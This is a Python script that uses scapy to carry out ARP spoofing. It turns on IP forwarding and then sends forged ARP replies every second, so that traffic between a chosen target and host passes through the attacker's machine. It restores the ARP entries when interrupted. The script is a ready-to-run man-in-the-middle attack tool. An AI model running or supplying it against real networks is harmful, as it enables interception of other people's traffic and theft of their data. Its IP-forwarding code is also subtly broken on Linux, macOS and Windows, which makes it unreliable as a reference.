

# IMPORTANT MODULES:
from scapy.all import Ether, ARP, srp, send
import time
import os



try:
    import _winreg as winreg
except ImportError:
    pass


def _enable_linux_ipforwarding():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def _enable_macosx_ipforwarding():
    os.system('sudo sysctl -w net.inet.ip.forwarding=1')


def _enable_windows_ipforwarding():
    name = "IPEnableRouter"
    value = 1
    REG_PATH = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_DWORD, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False

def enable_ip_route():
    print("ENABLING IP FORWARDING...")
    _enable_windows_ipforwarding() if "nt" in os.name else (_enable_macosx_ipforwarding if "posix" in os.name else _enable_linux_ipforwarding())
    print("IP FORWARDING ENABLED...")


def get_mac(ip):

    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) 
    if ans:
        return ans[0][1].src


def poison(target_ip, host_ip):
    # GET HARDWARE OF TARGET
    target_mac = get_mac(target_ip)
    # CRAFT ARP RESPONSE PACKET
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # SEND THE PACKET
    send(arp_response)
    # GET OUR HARDWARE ADDRESS
    self_mac = ARP().hwsrc
    # LOG WHAT IS HAPPENING
    print("SPOOFED " + target_ip + ": " + host_ip + " is-at " + self_mac)


def restore(target_ip, host_ip):
    # GET HARDWARE ADDRESS OF TARGET 
    target_mac = get_mac(target_ip)
    # GET HARDWARE ADDRESS OF HOST
    host_mac = get_mac(host_ip)
    # CRAFT ARP RESPONSE PACKET TO RESTORE 
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # SEND THE RESTORE PACKET
    send(arp_response, verbose=0, count=5)
    print("(UN) SPOOFED " + target_ip + ": " + host_ip + " is-at " + host_mac)


if __name__ == "__main__":
  
    target = input("Enter IP address of the target: ")

    host = input("Enter IP address of the host: ")

    enable_ip_route()
    try:
        while True:
            # TELL TARGET THAT WE ARE HOST
            poison(target, host)
            # TELL HOST THAT WE ARE TARGET 
            poison(host, target)
            # CONTINUOUSLY DO THAT
            time.sleep(1)
    except KeyboardInterrupt:
        print("KEYBOARD INTERRUPT, UNSPOOFING...")
        restore(target, host)
        restore(host, target)

